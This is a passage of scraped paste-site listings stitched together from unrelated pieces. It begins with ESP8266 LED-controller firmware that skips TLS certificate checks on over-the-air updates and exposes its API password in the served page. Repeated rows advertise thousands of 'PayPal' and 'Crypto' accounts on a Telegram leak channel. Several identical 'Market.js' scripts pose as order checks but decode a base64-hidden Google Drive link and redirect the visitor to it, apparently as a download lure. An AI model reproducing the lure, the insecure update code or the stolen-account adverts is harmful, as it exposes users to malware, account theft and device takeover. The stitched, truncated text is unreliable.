    brightness = constrain(brightness, 0, 1023);
    int targetBrightness = stateOn ? brightness : 0;
    String indicesStr = String(stripIndicesStr);
    int currentPos = 0;
    int nextPos = 0;
    while (nextPos != -1) {
        nextPos = indicesStr.indexOf(',', currentPos);
        String stripNumStr = (nextPos == -1) ? indicesStr.substring(currentPos) : indicesStr.substring(currentPos, nextPos);
        stripNumStr.trim();
        if (stripNumStr.length() > 0) {
            int stripNum = stripNumStr.toInt();
            if (stripNum >= 1 && stripNum <= numStrips) {
                int stripIndex = stripNum - 1;
                if (currentState.ledBrightness[stripIndex] != targetBrightness) {
                    currentState.ledBrightness[stripIndex] = targetBrightness;
                    changed = true;
                    Serial.printf(""Set Strip %d direct brightness: %d\n"", stripNum, targetBrightness);
                }
            } else { Serial.printf(""Invalid strip number in list: %s\n"", stripNumStr.c_str()); }
        }
        if (nextPos != -1) currentPos = nextPos + 1;
    }
    if (changed) {
         if (currentState.activeEffect == EFFECT_NONE) applyLedState(false);
        if (persist) saveStateToEEPROM(false);
    }
}

void setMasterBrightness(int brightness, bool persist) {
    brightness = constrain(brightness, 0, 1023);
    if (currentState.masterBrightness != brightness) {
        currentState.masterBrightness = brightness;
        Serial.printf(""Set Master Brightness: %d\n"", brightness);
        applyLedState(false);
        if (persist) saveStateToEEPROM(false);
    }
}

void setActiveEffect(EffectMode newEffect, bool persist) {
     if (newEffect < EFFECT_NONE || newEffect >= numEffects) return;
    if (currentState.activeEffect != newEffect) {
        currentState.activeEffect = newEffect;
        Serial.printf(""Set Active Effect: %s\n"", effectNames[currentState.activeEffect]);
        applyLedState(false);
        if (persist) saveStateToEEPROM(false);
    }
}

void setPirEnabled(bool enabled, bool persist) {
    if (currentState.pirEnabled != enabled) {
        currentState.pirEnabled = enabled;
        Serial.printf(""PIR Sensor %s\n"", enabled ? ""Enabled"" : ""Disabled"");
         if (!enabled) pirState = false;
        if (persist) saveStateToEEPROM(false);
    }
}

String getStatusJson() {
    StaticJsonDocument<1024> doc;
    doc[""firmware_version""] = CURRENT_FIRMWARE_VERSION;
    doc[""update_available""] = updateAvailable;
    doc[""latest_version""] = latestVersionTag;
    doc[""update_in_progress""] = updateInProgress;
    doc[""wifi_mode""] = apMode ? ""AP"" : ""STA"";
    doc[""ip_address""] = apMode ? WiFi.softAPIP().toString() : WiFi.localIP().toString();
    doc[""ap_ssid""] = apMode ? String(apSSID) : """";
    doc[""sta_ssid""] = apMode ? """" : WiFi.SSID();
    doc[""configured_sta_ssid""] = String(currentState.wifiSSID);
    doc[""using_hardcoded_wifi""] = (!apMode && WiFi.SSID() == hardcoded_ssid);
    doc[""wifi_connected""] = (WiFi.status() == WL_CONNECTED);
    doc[""master_brightness""] = currentState.masterBrightness;
    doc[""active_effect""] = effectNames[currentState.activeEffect];
    JsonObject pirStatus = doc.createNestedObject(""pir"");
    pirStatus[""enabled""] = currentState.pirEnabled;
    pirStatus[""motion_detected""] = pirState;
    JsonArray ledStates = doc.createNestedArray(""leds"");
    for (int i = 0; i < numStrips; i++) {
        JsonObject strip = ledStates.createNestedObject();
        strip[""strip""] = i + 1; strip[""pin""] = ledPins[i];
        int reportedBrightness = (currentState.activeEffect == EFFECT_NONE) ? constrain(currentState.ledBrightness[i], 0, currentState.masterBrightness) : effectLedBrightness[i];
        strip[""brightness""] = reportedBrightness;
        strip[""state""] = (reportedBrightness > 0) ? ""on"" : ""off"";
        strip[""base_brightness""] = currentState.ledBrightness[i];
    }
    String output; serializeJson(doc, output); return output;
}

void handleRoot() {
    String html = ""<html><head><title>ESP LED Control""; if (apMode) html += "" - WiFi Setup""; html += ""</title>"";
    html += ""<style>body{font-family: sans-serif; max-width: 600px; margin: auto; padding: 15px;}"";
    html += ""label{display: block; margin-top: 10px;} input{width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box;}"";
    html += ""button{padding: 10px 15px; margin-top: 15px; cursor: pointer;} .status{background-color: #f0f0f0; border: 1px solid #ccc; padding: 10px; margin-top: 20px; white-space: pre-wrap; word-wrap: break-word;}"";
    html += "".error{color: red; font-weight: bold;}</style>"";
    html += ""</head><body><h1>ESP8266 LED Controller</h1>"";
    if (apMode) {
        html += ""<h2>WiFi Setup Mode</h2><p>Connect this device to your WiFi network.</p>"";
        html += ""<p class='error'>You are currently connected to the device's setup network (<strong>""; html += apSSID; html += ""</strong>).</p>"";
        html += ""<form method='POST' action='/wifi'>"";
        html += ""<label for='ssid'>WiFi Network Name (SSID):</label><input type='text' id='ssid' name='ssid' required>"";
        html += ""<label for='pass'>WiFi Password:</label><input type='password' id='pass' name='pass'>"";
        html += ""<label for='pwd'>Device API Password (for this action):</label><input type='password' id='pwd' name='password' required>"";
        html += ""<button type='submit'>Save & Connect</button></form>"";
    } else {
        html += ""<h2>Device Control Panel</h2><p>Control LEDs, effects, and check for updates.</p>"";
        html += ""<p><a href='/wifi_setup?password="" + String(API_PASSWORD) + ""'>Switch to WiFi Setup Mode</a> (Requires password & reboot)</p>"";
        html += ""<h2>API Password Note</h2><p>Protected actions require the parameter <code>?password="" + String(API_PASSWORD) + ""</code> appended to the URL.</p>"";
    }
    html += ""<h2>Status</h2><div class='status' id='status'>Loading...</div>"";
    html += ""<script>function fetchStatus() { fetch('/status').then(response => response.ok ? response.json() : Promise.reject('Failed to fetch'))"";
    html += "".then(data => { document.getElementById('status').textContent = JSON.stringify(data, null, 2); })"";
    html += "".catch(error => { console.error('Error fetching status:', error); document.getElementById('status').textContent = 'Error loading status.'; }); }"";
    html += ""setInterval(fetchStatus, 5000); fetchStatus();</script>"";
    html += ""</body></html>""; server.send(200, ""text/html"", html);
}

void handleStatus() { server.send(200, ""application/json"", getStatusJson()); }

void handleWifiSave() {
     if (!isAuthenticated()) return;
    if (!server.hasArg(""ssid"") || server.arg(""ssid"") == """") { server.send(400, ""text/plain"", ""Missing SSID""); return; }
    String ssid = server.arg(""ssid""); String pass = server.arg(""pass"");
    strncpy(currentState.wifiSSID, ssid.c_str(), sizeof(currentState.wifiSSID) - 1); currentState.wifiSSID[sizeof(currentState.wifiSSID) - 1] = '\0';
    strncpy(currentState.wifiPassword, pass.c_str(), sizeof(currentState.wifiPassword) - 1); currentState.wifiPassword[sizeof(currentState.wifiPassword) - 1] = '\0';
    Serial.println(""New WiFi credentials received via API:""); Serial.print(""  SSID: ""); Serial.println(currentState.wifiSSID);
    saveStateToEEPROM(true);
    String html = ""<html><head><title>WiFi Saved</title><meta http-equiv='refresh' content='10;url=/'></head><body><h1>WiFi Settings Saved!</h1><p>Device will now attempt to connect to '<strong>"";
    html += ssid; html += ""</strong>'.</p><p>Rebooting in 5 seconds...</p></body></html>"";
    server.send(200, ""text/html"", html); delay(5000); ESP.restart();
}

void handleWifiSetup() {
     if (!isAuthenticated()) return;
    String html = ""<html><head><title>Entering WiFi Setup</title></head><body><h1>Entering WiFi Setup Mode</h1><p>Device will reboot into Access Point mode.</p>"";
    html += ""<p>Connect to '<strong>""; html += apSSID; html += ""</strong>' (password: <strong>""; html += apPassword; html += ""</strong>) and browse to <a href='http://192.168.4.1'>http://192.168.4.1</a>.</p>"";
    html += ""<p>Rebooting now...</p></body></html>""; server.send(200, ""text/html"", html);
    Serial.println(""Clearing WiFi credentials to force AP mode on reboot."");
    memset(currentState.wifiSSID, 0, sizeof(currentState.wifiSSID)); memset(currentState.wifiPassword, 0, sizeof(currentState.wifiPassword));
    saveStateToEEPROM(true); delay(2000); ESP.restart();
}

void handleLedControl() {
    if (!isAuthenticated()) return;
    bool stateOn = false; int brightness = -1; bool stateParam = false; bool brightnessParam = false; bool persist = true; String stripsToSet = """";
    if (server.hasArg(""brightness"")) { brightness = server.arg(""brightness"").toInt(); brightness = constrain(brightness, 0, 1023); brightnessParam = true; stateOn = (brightness > 0); stateParam = true; }
    else if (server.hasArg(""state"")) { stateOn = server.arg(""state"").equalsIgnoreCase(""on""); stateParam = true; brightness = stateOn ? currentState.masterBrightness : 0; brightnessParam = true; }
    if (!stateParam && !brightnessParam) { server.send(400, ""application/json"", ""{\""error\"":\""Missing state or brightness parameter\""}""); return; }
    if (server.hasArg(""all"") && server.arg(""all"").equalsIgnoreCase(""true"")) { for (int i = 1; i <= numStrips; ++i) stripsToSet += String(i) + (i < numStrips ? "","" : """"); }
    else if (server.hasArg(""strip"")) { stripsToSet = server.arg(""strip""); } else if (server.hasArg(""strips"")) { stripsToSet = server.arg(""strips""); }
    else { server.send(400, ""application/json"", ""{\""error\"":\""Missing strip, strips, or all parameter\""}""); return; }
    if(currentState.activeEffect != EFFECT_NONE) setActiveEffect(EFFECT_NONE, persist);
    setMultipleLeds(stripsToSet.c_str(), brightness, stateOn, persist); handleStatus();
}

void handleEffectControl() {
    if (!isAuthenticated()) return; bool persist = true; bool changed = false;
    if (server.hasArg(""master_brightness"")) { int mb = server.arg(""master_brightness"").toInt(); setMasterBrightness(mb, persist); changed = true; }
    if (server.hasArg(""mode"")) { String modeStr = server.arg(""mode""); modeStr.toLowerCase(); EffectMode requestedEffect = EFFECT_NONE; bool found = false;
        for (int i = 0; i < numEffects; i++) { if (modeStr == effectNames[i]) { requestedEffect = (EffectMode)i; found = true; break; } }
        if (found) { setActiveEffect(requestedEffect, persist); changed = true; } else { server.send(400, ""application/json"", ""{\""error\"":\""Invalid effect mode\""}""); return; } }
    if (!changed) { server.send(400, ""application/json"", ""{\""error\"":\""Missing mode or master_brightness parameter\""}""); return; } handleStatus();
}

void handlePirControl() {
    if (!isAuthenticated()) return;
    if (server.hasArg(""enabled"")) { bool enable = server.arg(""enabled"").equalsIgnoreCase(""true""); setPirEnabled(enable, true); handleStatus(); }
    else { server.send(400, ""application/json"", ""{\""error\"":\""Missing enabled parameter (true/false)\""}""); }
}

void handleUpdateCheck() {
    if (updateInProgress) { server.send(503, ""application/json"", ""{\""error\"":\""Update already in progress\""}""); return; }
    checkForUpdates(true); handleStatus();
}

void handleUpdateTrigger() {
    if (!isAuthenticated()) return;
    if (updateInProgress) {
        server.send(503, ""application/json"", ""{\""error\"":\""Update already in progress\""}"");
        return;
    }
    checkForUpdates(true);
    if (!updateAvailable || firmwareUrl.isEmpty()) {
        server.send(400, ""application/json"", ""{\""error\"":\""No update available or firmware URL missing\"", \""latest_version\"":\"""" + latestVersionTag + ""\""}"");
        return;
    }

    Serial.println(""Starting OTA update via API request..."");
    updateInProgress = true;
    server.send(202, ""application/json"", ""{\""message\"":\""Update started. Device will reboot if successful.\"", \""url\"":\"""" + firmwareUrl + ""\""}"");
    delay(100);

    WiFiClientSecure clientSecure;
    clientSecure.setInsecure(); // Necessary for GitHub without certificate validation

    ESPhttpUpdate.setLedPin(LED_BUILTIN, LOW);
    ESPhttpUpdate.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS); // Fix: Enable following redirects

    t_httpUpdate_return ret = ESPhttpUpdate.update(clientSecure, firmwareUrl);

    updateInProgress = false;
    ESPhttpUpdate.setLedPin(LED_BUILTIN, HIGH);

    switch (ret) {
        case HTTP_UPDATE_FAILED:
            Serial.printf(""HTTP_UPDATE_FAILED Error (%d): %s\n"", ESPhttpUpdate.getLastError(), ESPhttpUpdate.getLastErrorString().c_str());
            // Optionally send error back to client if possible (might reboot before this)
            break;
        case HTTP_UPDATE_NO_UPDATES:
            Serial.println(""HTTP_UPDATE_NO_UPDATES""); // Should not happen here as we checked version before
            break;
        case HTTP_UPDATE_OK:
            Serial.println(""HTTP_UPDATE_OK - Rebooting..."");
            // Will reboot automatically
            break;
        default:
             Serial.printf(""HTTP Update Unknown return code: %d\n"", ret);
             break;
    }
}


void handleReboot() { if (!isAuthenticated()) return; server.send(200, ""application/json"", ""{\""message\"":\""Rebooting device...\""}""); delay(1000); ESP.restart(); }

void handleNotFound() { if (apMode && handleCaptivePortal()) { /* Redirected */ } else { server.send(404, apMode ? ""text/plain"" : ""application/json"", apMode ? ""AP Mode: Not Found. Go to http://192.168.4.1"" : ""{\""error\"":\""Not Found\""}""); } }

bool handleCaptivePortal() {
    if (!apMode) return false;
    String host = server.hostHeader();
    IPAddress currentIP = WiFi.softAPIP();

    // Check if the host header is not the AP's IP or assigned hostname
    if (!host.equals(currentIP.toString()) && !host.equals(apSSID)) {
        Serial.print(""Captive portal redirect: Host=""); Serial.print(host); Serial.print("" -> http://""); Serial.println(currentIP);
        server.sendHeader(""Location"", String(""http://"") + currentIP.toString(), true);
        server.send(302, ""text/plain"", """"); // 302 Found / Redirect
        return true;
    }
    return false;
}


void updateEffects() {
    if (currentState.activeEffect == EFFECT_NONE) return;
    unsigned long currentTime = millis(); unsigned long elapsedTime = currentTime - effectStartTime; float effectProgress; int calculatedBrightness;
    auto applyMaster = [&](int base) { return constrain((long)base * currentState.masterBrightness / 1023, 0, 1023); };
    switch (currentState.activeEffect) {
        case EFFECT_BREATHE: { const int duration = 3000; effectProgress = fmod((float)elapsedTime, duration) / duration; calculatedBrightness = applyMaster((int)((sin(effectProgress * 2.0 * PI - PI / 2.0) + 1.0) / 2.0 * 1023)); for (int i = 0; i < numStrips; i++) { effectLedBrightness[i] = calculatedBrightness; analogWrite(ledPins[i], calculatedBrightness); } break; }
        case EFFECT_SEQUENCE_ON: { const int stepDuration = 500; int currentStep = (elapsedTime / stepDuration) % numStrips; calculatedBrightness = applyMaster(1023); for (int i = 0; i < numStrips; i++) { int b = (i <= currentStep) ? calculatedBrightness : 0; effectLedBrightness[i] = b; analogWrite(ledPins[i], b); } break; }
        case EFFECT_SEQUENCE_OFF: { const int stepDuration = 500; int currentStep = (elapsedTime / stepDuration) % numStrips; calculatedBrightness = applyMaster(1023); for(int i=0; i<numStrips; i++) { int b = (i <= currentStep) ? 0 : calculatedBrightness; effectLedBrightness[i] = b; analogWrite(ledPins[i], b); } break; }
        case EFFECT_CHASE: { const int stepDuration = 250; int currentStep = (elapsedTime / stepDuration) % numStrips; calculatedBrightness = applyMaster(1023); for(int i=0; i<numStrips; i++) { int b = (i == currentStep) ? calculatedBrightness : 0; effectLedBrightness[i] = b; analogWrite(ledPins[i], b); } break; }
        case EFFECT_SWELL: { const int duration = 2000; effectProgress = fmod((float)elapsedTime, duration) / duration; float sineVal = (sin(effectProgress * 2.0 * PI - PI / 2.0) + 1.0) / 2.0; int brightCenter = applyMaster((int)(sineVal * 1023)); int brightOuter = applyMaster((int)((1.0 - sineVal) * 1023)); if (numStrips == 4) { effectLedBrightness[0] = brightOuter; analogWrite(ledPins[0], brightOuter); effectLedBrightness[1] = brightCenter; analogWrite(ledPins[1], brightCenter); effectLedBrightness[2] = brightCenter; analogWrite(ledPins[2], brightCenter); effectLedBrightness[3] = brightOuter; analogWrite(ledPins[3], brightOuter); } else { for(int i=0; i<numStrips; i++) { effectLedBrightness[i] = brightCenter; analogWrite(ledPins[i], brightCenter); } } break; }
        case EFFECT_RANDOM_SOFT: { const int changeInterval = 1500; if (elapsedTime / changeInterval != effectStep) { effectStep = elapsedTime / changeInterval; for(int i=0; i<numStrips; i++) { int targetBrightness = applyMaster(random(100, 700)); effectLedBrightness[i] = targetBrightness; analogWrite(ledPins[i], targetBrightness); } } break; }
        case EFFECT_CYCLE: { const int cycleDurationPerLed = 2000; int currentLedIndex = (elapsedTime / cycleDurationPerLed) % numStrips; float ledProgress = fmod((float)elapsedTime, cycleDurationPerLed) / cycleDurationPerLed; calculatedBrightness = applyMaster((int)(sin(ledProgress * PI) * 1023)); for (int i = 0; i < numStrips; i++) { int b = (i == currentLedIndex) ? calculatedBrightness : 0; effectLedBrightness[i] = b; analogWrite(ledPins[i], b); } break; }
        case EFFECT_CANDLE: { const int changeInterval = 150; if (elapsedTime / changeInterval != effectStep) { effectStep = elapsedTime / changeInterval; for (int i = 0; i < numStrips; i++) { int baseBright = applyMaster(800); int flicker = applyMaster(random(-150, 150)); calculatedBrightness = constrain(baseBright + flicker, 0, applyMaster(1023)); effectLedBrightness[i] = calculatedBrightness; analogWrite(ledPins[i], calculatedBrightness); } } break; }
        case EFFECT_WAVE: { const int waveDuration = 5000; const float waveLength = (float)numStrips * 1.5; effectProgress = fmod((float)elapsedTime, waveDuration) / waveDuration; for (int i = 0; i < numStrips; i++) { float posOffset = (float)i / waveLength; float sineVal = (sin((effectProgress - posOffset) * 2.0 * PI) + 1.0) / 2.0; calculatedBrightness = applyMaster((int)(sineVal * 1023)); effectLedBrightness[i] = calculatedBrightness; analogWrite(ledPins[i], calculatedBrightness); } break; }
        case EFFECT_RAMP_UP: { const int duration = 5000; effectProgress = min(1.0f, (float)elapsedTime / duration); calculatedBrightness = applyMaster((int)(effectProgress * 1023)); for(int i=0; i<numStrips; i++) { effectLedBrightness[i] = calculatedBrightness; analogWrite(ledPins[i], calculatedBrightness); } break; }
        case EFFECT_RAMP_DOWN: { const int duration = 5000; effectProgress = min(1.0f, (float)elapsedTime / duration); calculatedBrightness = applyMaster((int)((1.0 - effectProgress) * 1023)); for(int i=0; i<numStrips; i++) { effectLedBrightness[i] = calculatedBrightness; analogWrite(ledPins[i], calculatedBrightness); } break; }
        default: setActiveEffect(EFFECT_NONE, true); break;
    }
}

void readPIR() {
     bool currentReading = digitalRead(pirPin); if (currentReading != lastPirReading) { lastPirChangeTime = millis(); } if ((millis() - lastPirChangeTime) > pirDebounceDelay) { if (currentReading != pirState) { if (currentState.pirEnabled) { pirState = currentReading; Serial.printf(""PIR Motion: %s\n"", pirState ? ""Yes"" : ""No""); } else if (pirState) { pirState = false; Serial.println(""PIR Motion Cleared (Sensor Disabled)""); } } } lastPirReading = currentReading;
}

int compareVersions(const String& v1, const String& v2) {
    String v1_num = v1; v1_num.replace(""v"", """");
    String v2_num = v2; v2_num.replace(""v"", """");
    return v1_num.compareTo(v2_num);
}

void checkForUpdates(bool forceCheck) {
    static unsigned long lastUpdateCheck = 0;
    if (!forceCheck && millis() - lastUpdateCheck < 3600000) return;
    if (WiFi.status() != WL_CONNECTED) return;

    lastUpdateCheck = millis();
    Serial.println(""Checking for firmware updates..."");
    String releaseUrl = ""https://api.github.com/repos/"";
    releaseUrl += gh_repo_user; releaseUrl += ""/"";
    releaseUrl += gh_repo_name; releaseUrl += ""/releases/latest"";

    firmwareUrl = """";
    latestVersionTag = """";
    updateAvailable = false;

    WiFiClientSecure client;
    client.setInsecure();
    HTTPClient http;

    Serial.print(""Requesting URL: ""); Serial.println(releaseUrl);

    if (http.begin(client, releaseUrl)) {
        http.setUserAgent(""ESP8266-http-Update""); // Good practice to set User Agent
        int httpCode = http.GET();
        if (httpCode == HTTP_CODE_OK) {
            DynamicJsonDocument doc(2048);
            DeserializationError error = deserializeJson(doc, http.getStream());
            if (!error) {
                latestVersionTag = doc[""tag_name""].as<String>();
                if (!latestVersionTag.isEmpty() && compareVersions(latestVersionTag, CURRENT_FIRMWARE_VERSION) > 0) {
                    Serial.printf(""Newer version available: %s (Current: %s)\n"", latestVersionTag.c_str(), CURRENT_FIRMWARE_VERSION);
                    JsonArray assets = doc[""assets""];
                    for (JsonObject asset : assets) {
                        if (asset[""name""].as<String>() == ""firmware.bin"") {
                            firmwareUrl = asset[""browser_download_url""].as<String>();
                            updateAvailable = true;
                            Serial.print(""Firmware URL: ""); Serial.println(firmwareUrl);
                            break;
                        }
                    }
                    if (!updateAvailable) Serial.println(""ERROR: firmware.bin not found in latest release assets!"");
                } else {
                     Serial.print(""Current version ""); Serial.print(CURRENT_FIRMWARE_VERSION);
                     Serial.print("", Latest fetched version ""); Serial.print(latestVersionTag);
                     Serial.println("". No new update available or version is not newer."");
                }
            } else {
                Serial.printf(""deserializeJson() failed: %s\n"", error.c_str());
            }
        } else {
            Serial.printf(""HTTP GET failed, error: %s (Code: %d)\n"", http.errorToString(httpCode).c_str(), httpCode);
        }
        http.end();
    } else {
        Serial.println(""Unable to connect to GitHub API"");
    }
}


bool attemptWifiConnection(const char* attemptSSID, const char* attemptPassword) {
    if (attemptSSID == nullptr || strlen(attemptSSID) == 0) return false;
    Serial.printf(""Attempting to connect to SSID: %s\n"", attemptSSID);
    if (attemptPassword == nullptr) {
      WiFi.begin(attemptSSID);
    } else {
      WiFi.begin(attemptSSID, attemptPassword);
    }

    unsigned long startAttemptTime = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < wifiConnectTimeout) {
        delay(500); Serial.print(""."");
    }
    Serial.println();
    return (WiFi.status() == WL_CONNECTED);
}

void startAPMode() {
    Serial.println(""Starting AP Mode...""); apMode = true;
    WiFi.disconnect(true); // Ensure STA is off
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, apNetmask);
    bool result = WiFi.softAP(apSSID, apPassword);

    if(result) {
      Serial.println(""AP Started"");
      Serial.print(""AP IP address: ""); Serial.println(WiFi.softAPIP());
      Serial.print(""AP SSID: ""); Serial.println(apSSID);
      dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
      dnsServer.start(53, ""*"", apIP);
    } else {
      Serial.println(""AP Failed to start"");
      // Maybe reboot?
      delay(1000);
      ESP.restart();
    }

    if (currentState.magic != EEPROM_MAGIC_NUMBER) { Serial.println(""Saving default state to EEPROM in AP mode."");
        currentState.masterBrightness = 1023; for (int i = 0; i < numStrips; i++) currentState.ledBrightness[i] = 0;
        currentState.activeEffect = EFFECT_NONE; currentState.pirEnabled = false; currentState.magic = EEPROM_MAGIC_NUMBER; saveStateToEEPROM(true); }
}

void startSTAMode() {
    Serial.println(""Starting STA Mode...""); apMode = false;
    WiFi.softAPdisconnect(true); // Ensure AP is off
    WiFi.mode(WIFI_STA);
    bool connected = false;

    if (strlen(currentState.wifiSSID) > 0) {
        Serial.println(""Trying connection with EEPROM credentials..."");
        connected = attemptWifiConnection(currentState.wifiSSID, currentState.wifiPassword);
    } else { Serial.println(""No WiFi credentials stored in EEPROM.""); }

    if (!connected && strlen(hardcoded_ssid) > 0) {
        Serial.println(""EEPROM connection failed or skipped. Trying hardcoded credentials..."");
        connected = attemptWifiConnection(hardcoded_ssid, hardcoded_password);
    } else if (!connected) { Serial.println(""No hardcoded SSID defined.""); }

    if (connected) {
        Serial.println(""WiFi connected successfully!""); Serial.print(""IP address: ""); Serial.println(WiFi.localIP()); Serial.print(""Connected to SSID: ""); Serial.println(WiFi.SSID());
        updateCheckTicker.attach(3600, [](){ checkForUpdates(false); });
        checkForUpdates(true);
    } else {
        Serial.println(""Failed to connect using EEPROM and Hardcoded credentials. Falling back to AP Mode."");
        WiFi.disconnect(true); // Disconnect from any failed attempts
        startAPMode();
    }
}

void setup() {
    pinMode(LED_BUILTIN, OUTPUT);
    digitalWrite(LED_BUILTIN, HIGH);
    Serial.begin(115200); Serial.println(""\n\nESP8266 Multi-Strip LED Controller (AP+OTA+Fallback)""); Serial.print(""Firmware Version: ""); Serial.println(CURRENT_FIRMWARE_VERSION);
    EEPROM.begin(EEPROM_SIZE); loadStateFromEEPROM(); pinMode(pirPin, INPUT); for (int i = 0; i < numStrips; i++) pinMode(ledPins[i], OUTPUT);
    analogWriteRange(1023); applyLedState(false);
    WiFi.persistent(false); // Prevent SDK from saving WiFi config automatically

    startSTAMode();

    server.on(""/"", HTTP_GET, handleRoot);
    server.on(""/status"", HTTP_GET, handleStatus);
    server.on(""/led"", HTTP_GET, handleLedControl);
    server.on(""/effect"", HTTP_GET, handleEffectControl);
    server.on(""/pir"", HTTP_GET, handlePirControl);
    server.on(""/wifi"", HTTP_POST, handleWifiSave);
    server.on(""/wifi_setup"", HTTP_GET, handleWifiSetup);
    server.on(""/update/check"", HTTP_GET, handleUpdateCheck);
    server.on(""/update/trigger"", HTTP_GET, handleUpdateTrigger);
    server.on(""/reboot"", HTTP_GET, handleReboot);

    server.onNotFound(handleNotFound);
    server.begin(); Serial.println(""HTTP server started"");
    pirTicker.attach_ms(100, readPIR); Serial.println(""Setup complete."");
}

void loop() {
     if (apMode) { dnsServer.processNextRequest(); }
     server.handleClient();
     yield(); // Give time to background processes
}"
i9XXew88,PayPal with Balance,iLoveToWatch,JavaScript,Thursday 24th of April 2025 06:12:30 PM CDT,23677 Accounts Posted On https://t.me/leakedbyeminem
ZjDTeyEq,Market.js,x2LeaF,JavaScript,Thursday 24th of April 2025 06:11:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XeFp4XvB,PayPal with Balance,Xp_Isolation,JavaScript,Thursday 24th of April 2025 05:57:04 PM CDT,20495 Accounts Posted On https://t.me/leakedbyeminem
w0XV3CCw,Untitled,x2LeaF,JavaScript,Thursday 24th of April 2025 05:56:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93889/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sT8qj6W0,Crypto Accounts,x2LeaF,JavaScript,Thursday 24th of April 2025 05:41:35 PM CDT,52378 Accounts Posted On https://t.me/leakedbyeminem
iXaspZEw,Market.js,jm33,JavaScript,Thursday 24th of April 2025 05:40:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16010/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cQ8Hvsx3,longest consecutive sequence,smj007,Python,Thursday 24th of April 2025 05:32:42 PM CDT,"# average tc: O(n), worst case tc: O(n*n) - because of hash collisions it can happen
# that the worst case of hash look up is O(n)

class Solution:
    def longestConsecutive(self, nums: List[int]) -> int:

        hashset = set()
        longest_streak = 0

        for num in nums:
            hashset.add(num)

        for i in range(len(nums)):
			# check if that it is the greatest number in neighbouring
            if nums[i] + 1 not in hashset:
                current_streak = 1
                current_num = nums[i]
				# keep checking untill you reach an endpoint
                while current_num-1 in hashset:
                    current_streak += 1
                    current_num -= 1

                longest_streak = max(longest_streak, current_streak)

        return longest_streak"
XyK18K81,PayPal with Balance,x2LeaF,JavaScript,Thursday 24th of April 2025 05:26:11 PM CDT,97198 Accounts Posted On https://t.me/leakedbyeminem
154kmdp7,Untitled,jm33,JavaScript,Thursday 24th of April 2025 05:25:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28964/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

